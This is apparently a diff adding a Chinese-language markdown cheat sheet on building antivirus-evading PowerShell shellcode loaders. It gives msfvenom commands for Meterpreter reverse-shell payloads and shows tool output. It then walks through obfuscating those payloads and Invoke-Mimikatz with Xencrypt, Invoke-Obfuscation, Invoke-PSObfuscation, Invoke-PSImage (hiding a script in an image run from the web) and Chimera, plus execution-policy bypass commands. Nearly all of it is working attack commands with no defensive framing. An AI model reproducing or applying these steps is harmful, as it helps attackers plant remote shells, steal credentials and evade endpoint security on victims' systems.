@@ -1,0 +1,111 @@
+# POWERSHELL混淆免杀shellcodeloader
+
+00 
+
+可以在PowerShell中执行命令来查看和设置执行策略，如果需要执行Powershell脚本程序，需要使用管理员权限将Restricted改为Unrestricted。
+
+```
+Get-ExecutionPolicy 
+Set-ExecutionPolicy Unrestricted
+powershell.exe -ExecutionPolicy Bypass -File .\test1.ps1
+```
+
+payload 生成
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.121 lport=4444 --arch x64 --platform wiindows -f psh-reflection -o 4444.ps1
+```
+
+1.XencryptX 加密  (  项目： [the-xentropy/xencrypt: A PowerShell script anti-virus evasion tool (github.com)](https://github.com/the-xentropy/xencrypt)
+
+```
+Import-Module ./xencrypt.ps1
+Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1
+迭代次数
+Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100
+```
+
+2.[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) powershell混淆免杀
+
+```
+Import-Module ./Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+set scriptpath +文件位置
+选择混淆方式为 TOKEN\ALL
+保存混淆之后的脚本
+out out.ps1
+```
+
+3.ps2exe 把powershell转化成exe去执行
+
+4.[Invoke-PSObfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation) powershell混淆免杀
+
+```
+┌──(tristram㉿kali)-[~]
+└─$ pwsh 
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS /home/kali> msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f ps1 -o meterpreter.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 686 bytes
+Final size of ps1 file: 3385 bytes
+Saved as: meterpreter.ps1
+PS /home/kali> . ./Invoke-PSObfuscation.ps1                                                                                        
+PS /home/kali> Invoke-PSObfuscation -Path ./meterpreter.ps1 -Integers -Variables -OutFile o-meterpreter.ps1                     
+
+     >> Layer 0 Obfuscation
+     >> https://github.com/gh0x0st
+
+[*] Obfuscating integers
+[*] Obfuscating variables
+[*] Writing payload to o-meterpreter.ps1
+[*] Done
+```
+
+5.[Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage)
+
+Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from disk:
+
+```
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
+   [Oneliner to execute from a file]
+```
+
+
+
+Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from the web (you still have to host the image and edit the URL):
+
+```
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
+   [Oneliner to execute from the web]
+```
+
+6.**[Chimera](https://github.com/tokyoneon/Chimera)**
+
+  Clone the repository. Tested in Kali v2020.3.
+
+```
+sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
+sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
+sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
+sudo chmod +x chimera.sh; ./chimera.sh --help
+```
+
+  Basic usage.
+
+```
+./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
+copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
+invoke-expression,out-string,write-error -j -g -k -r -p
+```
+
+Review the [usage guide](https://github.com/tokyoneon/Chimera/blob/master/USAGE.md) and [write-up](https://null-byte.com/bypass-amsi-0333967/) for more examples and screenshots.
